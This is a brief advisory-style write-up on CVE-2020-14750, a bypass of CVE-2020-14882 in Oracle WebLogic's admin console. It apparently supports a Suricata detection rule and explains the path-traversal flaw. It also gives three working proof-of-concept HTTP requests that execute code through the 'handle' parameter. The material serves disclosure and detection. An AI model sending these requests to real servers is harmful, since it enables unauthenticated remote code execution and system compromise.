## Overview
CVE-2020-14750 is a bypass of CVE-2020-14882. They could be used to get unauthenticated remote code execution on the administration interface (port 7001/TCP by default) of Oracle Weblogic Server.  

In a nutshell, they are path traversal vulnerabilities in the path with encoded "../", which allows attackers access /console/console.portal and execute Java code via the **handle** parameter. To make them pre-authenticated, attackers must use one of two paths like this:
* /console/**css**/../console.portal
* /console/**images**/../console.portal

When fixing CVE-2020-14882, Oracle used a blacklist to filter some special strings. Of course, they missed many trivial cases, which leads to a trivial bypass.  

If you cannot determine whether your Oracle Weblogic Servers are using only the default port 7001/TCP for the administration interface, you can use **any any -> any any** in the Suricata rule instead of **any any -> any 7001**.

## Proof of Concept
* GET method
```
GET /console/css/%%32e.%%32fconsole.portal?handle=com.tangosol.coherence.mvel2.sh.ShellSession%28%22java.lang.Runtime.getRuntime%28%29.exec%28%27calc%27%29%3B%22%29%3B HTTP/1.1
Host: example.com:7001
Content-Length: 0
```
* POST method with the payload on the URI
```
POST /console/css/%%32e.%%32fconsole.portal?handle=com.tangosol.coherence.mvel2.sh.ShellSession%28%22java.lang.Runtime.getRuntime%28%29.exec%28%27calc%27%29%3B%22%29%3B HTTP/1.1
Host: example.com:7001
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
* POST method with the payload in the body
```
POST /console/css/%%32e.%%32fconsole.portal HTTP/1.1
Host: example.com:7001
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('calc');");
```

## References
* https://github.com/jas502n/CVE-2020-14882
* https://twitter.com/steventseeley/status/1322138037543981056